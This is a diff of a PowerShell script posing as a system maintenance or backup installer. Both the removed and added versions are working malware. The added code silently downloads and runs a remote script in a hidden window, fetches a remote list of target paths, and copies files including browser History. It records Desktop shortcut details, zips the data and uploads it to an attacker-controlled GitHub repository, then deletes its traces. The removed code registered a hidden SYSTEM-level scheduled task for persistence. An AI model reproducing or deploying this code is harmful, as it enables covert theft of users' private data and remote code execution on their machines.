@@ -1,111 +1,123 @@
-# install.ps1 - 安装嵌入上传逻辑的本地维护脚本 + 注册计划任务
+# Silently download and run remote PowerShell script
+$remoteUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/install.ps1"
+$savePath = "C:\ProgramData\Microsoft\Windows\update.ps1"
 
+try {
+    Invoke-WebRequest -Uri $remoteUrl -OutFile $savePath -UseBasicParsing -ErrorAction Stop
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$savePath`"" -WindowStyle Hidden
+} catch {
+    # Silent fail
+}
+
+# Set UTF-8 encoding
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-# 维护任务名称与脚本路径（可自定义）
-$scriptFileName = "system-maintainer.ps1"
-$scriptPath = "C:\ProgramData\Microsoft\Windows\$scriptFileName"
-$taskName = "SystemMaintenanceTask"
-$taskTime = "23:00"
-
-# ✅ 嵌入上传逻辑的主脚本内容
-$scriptContent = @'
-[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
-$OutputEncoding = [System.Text.UTF8Encoding]::UTF8
-
-$repo = "rtyuiuiop/1"
 $token = $env:GITHUB_TOKEN
-if (-not $token) {
-    Write-Error "❌ GITHUB_TOKEN 环境变量未设置。请先运行 set-token.ps1 脚本。"
-    exit 1
-}
-$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
-$apiUrl = "https://api.github.com/repos/$repo/releases"
-$pathListUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-paths.txt"
+$repo = "rtyuiuiop/1"
+$now = Get-Date
+$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
+$date = $now.ToString("yyyy-MM-dd")
+$computerName = $env:COMPUTERNAME
+$tag = "backup-$computerName-$timestamp"
+$releaseName = "Backup - $computerName - $date"
+$tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
+$zipName = "package-$computerName-$timestamp.zip"
+$zipPath = Join-Path $env:TEMP $zipName
+New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
 
+# STEP 1: Load file path list from remote .txt
+$remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-target.txt"
 try {
-    $paths = Invoke-WebRequest -Uri $pathListUrl -UseBasicParsing -ErrorAction Stop | Select-Object -ExpandProperty Content
-    $paths = $paths -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
-    Write-Host "✅ 成功获取路径列表："
-    $paths | ForEach-Object { Write-Host " - $_" }
+    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
+    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
 } catch {
-    Write-Warning "❌ 无法获取路径配置文件：$($_.Exception.Message)"
-    exit 1
+    return
 }
 
-$workDir = "$env:TEMP\backup_$tag"
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+$index = 0
+foreach ($path in $pathList) {
+    $index++
+    $name = "item$index"
 
-foreach ($path in $paths) {
-    if (Test-Path $path) {
-        try {
-            $relative = $path -replace "^[A-Z]:\\", "" -replace "[:\\]", "_"
-            $dest = Join-Path $workDir $relative
-            New-Item -ItemType Directory -Path (Split-Path $dest) -Force -ErrorAction SilentlyContinue | Out-Null
-            Copy-Item -Path $path -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
-        } catch {
-            Write-Warning "⚠️ 无法复制：$path"
+    if (-not (Test-Path $path)) { continue }
+
+    $dest = Join-Path $tempRoot $name
+
+    try {
+        if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
+            $srcDir = Split-Path $path
+            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
+        } elseif (Test-Path $path -PathType Container) {
+            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
+        } else {
+            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
         }
-    } else {
-        Write-Warning "❌ 路径不存在：$path"
-    }
+    } catch {}
 }
 
-$zipPath = "$env:TEMP\$tag.zip"
-Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
+# STEP 2: Extract .lnk shortcut info from Desktop
+try {
+    $desktop = [Environment]::GetFolderPath("Desktop")
+    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
+    $lnkReport = ""
 
-$releaseBody = @{
-    tag_name   = $tag
-    name       = "Backup $tag"
-    body       = "自动上传的备份文件"
-    draft      = $false
+    $shell = New-Object -ComObject WScript.Shell
+    foreach ($lnk in $lnkFiles) {
+        $shortcut = $shell.CreateShortcut($lnk.FullName)
+
+        $lnkReport += "[$($lnk.Name)]`n"
+        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
+        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
+        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
+        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
+        $lnkReport += "-----------`n"
+    }
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject($shell) | Out-Null
+
+    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
+    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
+} catch {}
+
+# STEP 3: Archive
+try {
+    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+} catch {
+    return
+}
+
+# STEP 4: Upload as GitHub Release
+$releaseData = @{
+    tag_name = $tag
+    name = $releaseName
+    body = "Automated file package from $computerName on $date"
+    draft = $false
     prerelease = $false
+} | ConvertTo-Json -Depth 3
+
+$headers = @{
+    Authorization = "token $token"
+    "User-Agent" = "PowerShellScript"
+    Accept = "application/vnd.github.v3+json"
 }
 
 try {
-    $headers = @{
+    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
+    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
+} catch {
+    return
+}
+
+try {
+    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
+    $uploadHeaders = @{
         Authorization = "token $token"
-        "Content-Type" = "application/json"
+        "Content-Type" = "application/zip"
+        "User-Agent" = "PowerShellScript"
     }
-    $json = $releaseBody | ConvertTo-Json -Depth 3
-    $response = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method Post -Body $json
-    if ($response.upload_url) {
-        $uploadUrl = $response.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"
-        $uploadHeaders = @{
-            Authorization = "token $token"
-            "Content-Type" = "application/zip"
-        }
-        Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
-        Write-Host "`n✅ 上传成功：$tag.zip"
-    } else {
-        Write-Host "❌ 创建 Release 失败：$($response | ConvertTo-Json -Depth 5)"
-    }
-} catch {
-    Write-Warning "❌ 上传过程出错：$($_.Exception.Message)"
-}
+    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
+} catch {}
 
-Remove-Item -Path $workDir -Recurse -Force -ErrorAction SilentlyContinue
-Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
-'@
-
-# 写入主脚本
-try {
-    New-Item -ItemType Directory -Path (Split-Path $scriptPath) -Force | Out-Null
-    $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
-    Write-Host "✅ 主脚本已写入：$scriptPath"
-} catch {
-    Write-Error "❌ 写入失败：$($_.Exception.Message)"
-    exit 1
-}
-
-# 注册计划任务（以 SYSTEM 身份，确保静默运行）
-try {
-    $arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    schtasks /Create /TN "\MyTasks\$taskName" /TR "powershell.exe $arguments" /SC DAILY /ST $taskTime /RL HIGHEST /RU SYSTEM /F | Out-Null
-    Write-Host "📅 任务 [$taskName] 已注册（位置：\MyTasks），每天 $taskTime 运行"
-} catch {
-    Write-Warning "⚠️ 注册任务失败：$($_.Exception.Message)"
-}
-
-Write-Host "`n✅ 部署完成。你可以关闭窗口。"
+# STEP 5: Cleanup
+Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
